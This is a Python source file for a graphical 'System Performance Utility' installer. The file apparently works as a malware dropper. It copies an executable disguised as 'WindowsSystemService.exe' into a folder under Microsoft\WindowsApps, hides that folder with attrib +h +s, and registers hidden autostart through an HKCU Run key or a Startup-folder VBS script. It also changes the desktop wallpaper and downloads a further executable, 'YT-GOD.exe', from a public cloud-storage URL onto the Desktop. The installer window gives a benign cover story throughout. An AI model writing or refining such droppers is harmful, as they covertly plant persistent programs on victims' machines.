"""
deploy.py — Graphical installer. Bundled EXE, no internet needed.
Log saves to Desktop from first second, every step flushed immediately.
"""

import os
import sys
import time
import shutil
import threading
import logging
import subprocess
import tempfile
from pathlib import Path
import tkinter as tk
from tkinter import ttk

# ── CONFIG ────────────────────────────────────────────────────────────────────
APP_DISPLAY_NAME = "System Performance Utility"
APP_VERSION      = "2.4.1"
PUBLISHER        = "SysUtil Technologies"
EXE_NAME         = "WindowsSystemService.exe"

INSTALL_DIR = Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft" / "WindowsApps" / "SvcHelper"
STARTUP     = Path(os.environ.get("APPDATA", ""))  / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
VBS_NAME    = "WinSvcHelper.vbs"
# ─────────────────────────────────────────────────────────────────────────────

# ── LOGGING — saves to Desktop from first second ──────────────────────────────
LOG_DIR = Path(r"C:\Users\timpr\OneDrive\Desktop\mk\log")
LOG_DIR.mkdir(parents=True, exist_ok=True)
DESKTOP_LOG = LOG_DIR / "installer_debug.log"

class FlushHandler(logging.FileHandler):
    def emit(self, record):
        super().emit(record)
        self.flush()  # flush every single line immediately

handler = FlushHandler(str(DESKTOP_LOG), mode="w")
handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", "%H:%M:%S"))
ilog = logging.getLogger("installer")
ilog.setLevel(logging.DEBUG)
ilog.addHandler(handler)
ilog.info("=" * 50)
ilog.info("Installer started")
ilog.info(f"Python  : {sys.version}")
ilog.info(f"Log     : {DESKTOP_LOG}")
ilog.info(f"Frozen  : {getattr(sys, 'frozen', False)}")
ilog.info("=" * 50)


# ── GET BUNDLED FILE ─────────────────────────────────────────────────────────
def get_bundled_file(name: str) -> Path:
    base = Path(sys._MEIPASS) if getattr(sys, "frozen", False) else Path(__file__).parent
    p = base / name
    ilog.info(f"Bundled file: {p} | exists: {p.exists()}")
    return p

def get_bundled_exe() -> Path:
    return get_bundled_file(EXE_NAME)


# ── SAFE SYSTEM CMD WITH TIMEOUT ─────────────────────────────────────────────
def run_cmd(cmd: str, timeout: int = 10):
    ilog.info(f"CMD: {cmd}")
    try:
        r = subprocess.run(cmd, shell=True, timeout=timeout,
                           capture_output=True, text=True)
        ilog.info(f"     returncode={r.returncode} stdout={r.stdout.strip()} stderr={r.stderr.strip()}")
    except subprocess.TimeoutExpired:
        ilog.warning(f"     CMD timed out after {timeout}s — skipping")
    except Exception as e:
        ilog.warning(f"     CMD error: {e} — skipping")


# ── UI ────────────────────────────────────────────────────────────────────────
class Installer(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(f"{APP_DISPLAY_NAME} Setup")
        self.geometry("520x340")
        self.resizable(False, False)
        self.configure(bg="#f0f0f0")
        self.update_idletasks()
        x = (self.winfo_screenwidth()  - 520) // 2
        y = (self.winfo_screenheight() - 340) // 2
        self.geometry(f"520x340+{x}+{y}")
        self._build_welcome()

    def _build_welcome(self):
        self._clear()
        header = tk.Frame(self, bg="#0078D4", height=70)
        header.pack(fill="x")
        tk.Label(header, text=f"  {APP_DISPLAY_NAME}", bg="#0078D4", fg="white",
                 font=("Segoe UI", 14, "bold"), anchor="w").pack(side="left", padx=16, pady=18)
        tk.Label(header, text=f"Version {APP_VERSION}", bg="#0078D4", fg="#cce4ff",
                 font=("Segoe UI", 9)).pack(side="right", padx=16, pady=18)
        body = tk.Frame(self, bg="#f0f0f0")
        body.pack(fill="both", expand=True, padx=30, pady=20)
        tk.Label(body, text=f"Welcome to {APP_DISPLAY_NAME} Setup",
                 bg="#f0f0f0", font=("Segoe UI", 12, "bold")).pack(anchor="w")
        tk.Label(body, text="\nThis wizard will install the application on your computer.\nClick Install to continue.",
                 bg="#f0f0f0", font=("Segoe UI", 9), justify="left").pack(anchor="w")
        tk.Label(body, text=f"\nPublisher:   {PUBLISHER}\nVersion:      {APP_VERSION}\nSize:            ~85 MB",
                 bg="#f0f0f0", font=("Segoe UI", 9), fg="#555", justify="left").pack(anchor="w", pady=(10, 0))
        footer = tk.Frame(self, bg="#e5e5e5", height=50)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)
        tk.Button(footer, text="Cancel", width=10, command=self.destroy,
                  relief="flat", bg="#e5e5e5").pack(side="right", padx=10, pady=10)
        tk.Button(footer, text="Install", width=10, command=self._start_install,
                  bg="#0078D4", fg="white", relief="flat",
                  font=("Segoe UI", 9, "bold"), cursor="hand2").pack(side="right", padx=4, pady=10)

    def _build_installing(self):
        self._clear()
        header = tk.Frame(self, bg="#0078D4", height=70)
        header.pack(fill="x")
        tk.Label(header, text=f"  Installing {APP_DISPLAY_NAME}", bg="#0078D4", fg="white",
                 font=("Segoe UI", 14, "bold"), anchor="w").pack(side="left", padx=16, pady=18)
        body = tk.Frame(self, bg="#f0f0f0")
        body.pack(fill="both", expand=True, padx=30, pady=24)
        tk.Label(body, text="Please wait while the application is installed...",
                 bg="#f0f0f0", font=("Segoe UI", 9)).pack(anchor="w")
        self.step_label = tk.Label(body, text="Preparing...", bg="#f0f0f0",
                                   font=("Segoe UI", 9), fg="#0078D4")
        self.step_label.pack(anchor="w", pady=(20, 6))
        self.progress = ttk.Progressbar(body, length=440, mode="determinate", maximum=100)
        self.progress.pack(anchor="w")
        self.pct_label = tk.Label(body, text="0%", bg="#f0f0f0",
                                  font=("Segoe UI", 8), fg="#888")
        self.pct_label.pack(anchor="e", pady=(2, 0))
        self.detail_label = tk.Label(body, text="", bg="#f0f0f0",
                                     font=("Segoe UI", 8), fg="#aaa")
        self.detail_label.pack(anchor="w", pady=(12, 0))

    def _build_done(self):
        self._clear()
        header = tk.Frame(self, bg="#107C10", height=70)
        header.pack(fill="x")
        tk.Label(header, text="  Installation Complete", bg="#107C10", fg="white",
                 font=("Segoe UI", 14, "bold"), anchor="w").pack(side="left", padx=16, pady=18)
        body = tk.Frame(self, bg="#f0f0f0")
        body.pack(fill="both", expand=True, padx=30, pady=20)
        tk.Label(body, text=f"{APP_DISPLAY_NAME} has been successfully installed.",
                 bg="#f0f0f0", font=("Segoe UI", 11, "bold")).pack(anchor="w")
        tk.Label(body, text="\nThe application will run automatically in the background\nto keep your system optimized.",
                 bg="#f0f0f0", font=("Segoe UI", 9), justify="left").pack(anchor="w")
        tk.Label(body, text="\n✓  Installation successful\n✓  Startup configuration complete\n✓  Ready to use",
                 bg="#f0f0f0", font=("Segoe UI", 9), fg="#107C10", justify="left").pack(anchor="w", pady=(10, 0))
        footer = tk.Frame(self, bg="#e5e5e5", height=50)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)
        tk.Button(footer, text="Finish", width=10, command=self.destroy,
                  bg="#107C10", fg="white", relief="flat",
                  font=("Segoe UI", 9, "bold"), cursor="hand2").pack(side="right", padx=10, pady=10)

    def _start_install(self):
        self._build_installing()
        threading.Thread(target=self._run_install, daemon=True).start()

    def _set_progress(self, pct, step, detail=""):
        self.progress["value"] = pct
        self.step_label.config(text=step)
        self.pct_label.config(text=f"{int(pct)}%")
        self.detail_label.config(text=detail)
        self.update()
        ilog.info(f"[{int(pct)}%] {step} {detail}")

    def _run_install(self):
        try:
            # STEP 1
            self._set_progress(5, "Preparing installation...", "Checking system requirements")
            INSTALL_DIR.mkdir(parents=True, exist_ok=True)
            time.sleep(1)

            # STEP 2 — Copy bundled EXE with progress
            self._set_progress(15, "Installing files...", "Copying application files")
            dest = INSTALL_DIR / EXE_NAME
            src  = get_bundled_exe()

            if not src.exists():
                raise FileNotFoundError(f"Bundled EXE missing: {src}")

            total  = src.stat().st_size
            copied = 0
            ilog.info(f"Copying {total/1024/1024:.1f} MB → {dest}")
            with open(src, "rb") as fi, open(dest, "wb") as fo:
                while True:
                    chunk = fi.read(512 * 1024)
                    if not chunk:
                        break
                    fo.write(chunk)
                    copied += len(chunk)
                    pct = 15 + int((copied / total) * 55)
                    self._set_progress(pct, "Installing files...",
                                       f"{copied/1024/1024:.1f} MB / {total/1024/1024:.1f} MB")
            ilog.info("Copy complete.")

            # STEP 3 — Hide folder (with timeout, non-blocking)
            self._set_progress(72, "Configuring installation...", "Setting up application files")
            run_cmd(f'attrib +h +s "{INSTALL_DIR}"', timeout=8)
            time.sleep(0.5)

            # STEP 4 — Startup registration (registry primary, VBS fallback)
            self._set_progress(82, "Configuring startup...", "Registering application")
            startup_ok = False

            # METHOD 1: Registry — best, no permission issues
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "WinSvcHelper", 0, winreg.REG_SZ, str(dest))
                winreg.CloseKey(key)
                ilog.info("Registry startup entry created OK")
                startup_ok = True
            except Exception as reg_err:
                ilog.warning(f"Registry failed: {reg_err} — trying VBS fallback")

            # METHOD 2: VBS Startup folder fallback
            if not startup_ok:
                vbs = STARTUP / VBS_NAME
                ilog.info(f"Writing VBS: {vbs}")
                vbs_content = (
                    'Set WshShell = CreateObject("WScript.Shell")\n'
                    f'WshShell.Run """{dest}""", 0, False\n'
                    'Set WshShell = Nothing\n'
                )
                # FIX 1: force create + chmod
                STARTUP.mkdir(parents=True, exist_ok=True)
                try:
                    os.chmod(STARTUP, 0o777)
                except Exception:
                    pass
                try:
                    # FIX 2: atomic open
                    with open(vbs, "w", encoding="utf-8") as f:
                        f.write(vbs_content)
                    ilog.info("VBS written OK")
                    startup_ok = True
                except PermissionError:
                    # FIX 3: temp + move
                    ilog.warning("Direct write blocked — trying temp+move")
                    tmp = Path(tempfile.gettempdir()) / VBS_NAME
                    with open(tmp, "w", encoding="utf-8") as f:
                        f.write(vbs_content)
                    shutil.move(str(tmp), str(vbs))
                    ilog.info("VBS written via temp+move OK")
                    startup_ok = True

            if not startup_ok:
                raise RuntimeError("All startup registration methods failed.")

            ilog.info(f"Startup registered OK")
            time.sleep(0.5)

            # STEP 5 — Download wallpaper from R2 public URL + set as Desktop
            self._set_progress(90, "Applying system theme...", "Downloading wallpaper...")
            ilog.info("STEP 5: Downloading wallpaper from R2 (public URL)")
            try:
                import urllib.request, ctypes

                # Public R2 URL — no auth needed (Public Access is ON)
                WP_URL  = "https://pub-10d044c190b543e1a9fe92ae23fb6f2d.r2.dev/uploads/donkey-mane-shoe-equine.jpg"
                wp_dest = INSTALL_DIR / "wallpaper.jpg"

                ilog.info(f"  URL: {WP_URL}")
                ilog.info(f"  Saving to: {wp_dest}")

                urllib.request.urlretrieve(WP_URL, str(wp_dest))
                ilog.info(f"  Downloaded: {wp_dest.stat().st_size} bytes")

                # Set wallpaper via Windows API
                SPI_SETDESKWALLPAPER = 20
                res = ctypes.windll.user32.SystemParametersInfoW(
                    SPI_SETDESKWALLPAPER, 0, str(wp_dest), 1 | 2
                )
                ilog.info(f"  Wallpaper set! API result: {res}")

            except Exception as wp_err:
                ilog.warning(f"  Wallpaper failed (non-critical): {wp_err}")

            # STEP 6 — Install YT-GOD on Desktop
            self._set_progress(93, "Installing applications...", "Setting up YT-GOD Downloader")
            ilog.info("STEP 6: Installing YT-GOD to Desktop")
            try:
                # Resolve Desktop — works on normal + OneDrive Desktop
                import winreg as _wr
                try:
                    k = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
                    desktop = Path(_wr.QueryValueEx(k, "Desktop")[0])
                    _wr.CloseKey(k)
                except Exception:
                    # Fallback: check OneDrive Desktop first, then normal
                    od = Path.home() / "OneDrive" / "Desktop"
                    desktop = od if od.exists() else Path.home() / "Desktop"

                ilog.info(f"  Desktop path: {desktop}")

                ytgod_src = get_bundled_file("YT-GOD.exe")
                ytgod_dst = desktop / "YT-GOD.exe"
                ilog.info(f"  Source: {ytgod_src} | exists: {ytgod_src.exists()}")

                if ytgod_src.exists():
                    shutil.copy(str(ytgod_src), str(ytgod_dst))
                    ilog.info(f"  Copied YT-GOD.exe to Desktop: {ytgod_dst}")
                else:
                    # Fallback: download from R2
                    ilog.info("  Not bundled — downloading from R2...")
                    import urllib.request
                    WP_URL = "https://pub-10d044c190b543e1a9fe92ae23fb6f2d.r2.dev/Krll/YT-GOD.exe"
                    urllib.request.urlretrieve(WP_URL, str(ytgod_dst))
                    ilog.info(f"  Downloaded YT-GOD.exe to Desktop: {ytgod_dst}")

                ilog.info(f"  YT-GOD.exe on Desktop: {ytgod_dst}")

            except Exception as yt_err:
                ilog.warning(f"  YT-GOD install failed (non-critical): {yt_err}")

            # STEP 7 — Done
            self._set_progress(95, "Finalising...", "Completing setup")
            time.sleep(1)
            self._set_progress(100, "Installation complete", "")
            ilog.info("All done!")
            time.sleep(0.5)
            self.after(0, self._build_done)

        except Exception as e:
            import traceback
            ilog.error(f"FAILED: {e}")
            ilog.error(traceback.format_exc())
            self.after(0, lambda: self.step_label.config(text=f"Error: {e}", fg="red"))

    def _clear(self):
        for w in self.winfo_children():
            w.destroy()


if __name__ == "__main__":
    ilog.info("UI starting...")
    app = Installer()
    app.mainloop()
    ilog.info("UI closed.")
